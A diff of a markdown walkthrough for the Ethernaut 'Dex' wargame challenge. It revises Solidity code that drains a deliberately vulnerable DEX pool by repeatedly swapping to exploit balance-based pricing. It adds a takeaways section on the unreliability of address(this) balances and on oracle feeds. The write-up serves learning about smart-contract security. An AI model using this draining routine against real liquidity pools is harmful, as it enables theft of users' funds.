@@ -125,66 +125,54 @@ function drain() public {
 Then we can commence the hack by transferring 10 token1 to the dex to cause a liquidity imbalance and transferring 10 token2 to the malicious contract we're writing so it can take the reins.
 
 ```
-    // send 10 token1 to dex to initialize unexpected contract liquidity imbalance
-    IERC20(token1).transferFrom(hacker, address(dex), 10);
-    // obtain 10token2 liquidity from hacker to start exploit
-    IERC20(token2).transferFrom(hacker, address(this), 10);
+// send 10 token1 to dex to initialize unexpected contract liquidity imbalance
+IERC20(token1).transferFrom(hacker, address(dex), 10);
+// obtain 10token2 liquidity from hacker to start exploit
+IERC20(token2).transferFrom(hacker, address(this), 10);
 ```
 
 Since we'll want the contract to continually swap back and forth until one side of the liquidity pool reaches 0, we can use a while loop:
 
 ```
 while (dex.balanceOf(token1, address(dex)) > 0 && dex.balanceOf(token2, address(dex)) > 0) {
-            uint balance = dex.balanceOf(token1, address(this));
+    uint balance = dex.balanceOf(token1, address(this));
 
-            // alternate swap in other direction
-            if (balance == 0) { 
-                balance = dex.balanceOf(token2, address(this));
-                
-                // set allowance for dex in from to msg.sender
-                b.approve(address(this), address(dex), balance);
+    // alternate swap in other direction
+    if (balance == 0) { 
+        balance = dex.balanceOf(token2, address(this));
+          
+        // set allowance for dex in from to msg.sender
+        b.approve(address(this), address(dex), balance);
 
-                // catch issue where swapAmount is set to 245, more than the dex pool holds!
-                if (dex.getSwapPrice(token2, token1, balance) > 110) {
-                    balance = 34;
-                    dex.swap(token2, token1, balance);
-                } else {
-                    dex.swap(token2, token1, balance);
-                }
-            } else {
-                a.approve(address(dex), balance);
-
-                // catch same swapAmount == 245 issue in reverse direction
-                if (dex.getSwapPrice(token1, token2, balance) > 110) {
-                    balance = 34;
-                    dex.swap(token1, token2, balance);
-                } else {
-                    dex.swap(token1, token2, balance);
-                }
-            }
-        }
-
-
-
-
-    IERC20(token1).transfer(dex, 10);  // send 10token1 to dex contract
-    while (dex.balanceOf(token1, dex) > 0 || dex.balanceOf(token2, dex) > 0) {
-        
-        balance = dex.balanceOf(token1, msg.sender);
-        if (!balance) { 
-            balance = dex.balanceOf(token2, msg.sender);
+        // catch issue where swapAmount is set to 245, more than the dex pool holds!
+        if (dex.getSwapPrice(token2, token1, balance) > 110) {
+            balance = 34;
+            dex.swap(token2, token1, balance);
+        } else {
             dex.swap(token2, token1, balance);
         }
+    } else {
+        a.approve(address(dex), balance);
 
-        dex.swap(token1, token2, balance);
-
+        // catch same swapAmount == 245 issue in reverse direction
+        if (dex.getSwapPrice(token1, token2, balance) > 110) {
+            balance = 34;
+            dex.swap(token1, token2, balance);
+        } else {
+            dex.swap(token1, token2, balance);
+        }
     }
 }
 ```
 
-suggestions for improvement:
-never rely on 
-1. centralized data sources for price and liquidity calculations
-2. recordkeeping via ```address(this)``` as it can be circumvented with transfers or selfdestruct()
+As you can see we had to catch the issue where the penultimate swap pushes the swap amount to a high amount, 245, which exceeds the balance of the liquidity pool. That will cause the final swap to fail and revert the transaction, so we manually entered the correct amount to rectify the final swap and fully drain the pool.
 
-implement decentralized oracle data feeds like those of Chainlink to replace ```balanceOf(address(this))``` calls.
+## Takeaways
+
+As you can see, it's recommended never to rely on balance readings performed on address(this). Whether done through the ERC20/721 balanceOf() method or Solidity's address(this).balance, this method can be rendered unreliable as the EVM is a permissionless environment where tokens can be added to an address unexpectedly. The classic example illustrating this issue is the selfdestruct() opcode that forcibly sends ether.
+
+A simple fix is to implement decentralized oracle data feeds like those of Chainlink to replace ```balanceOf(address(this))``` calls! There are of course a few considerations when using oracle data sources for price and liquidity calculations but it's leagues better than the code used in this Ethernaut challenge ;)
+
+Congratulations on your first Dex hack!
+
+○•○ h00t h00t ○•○
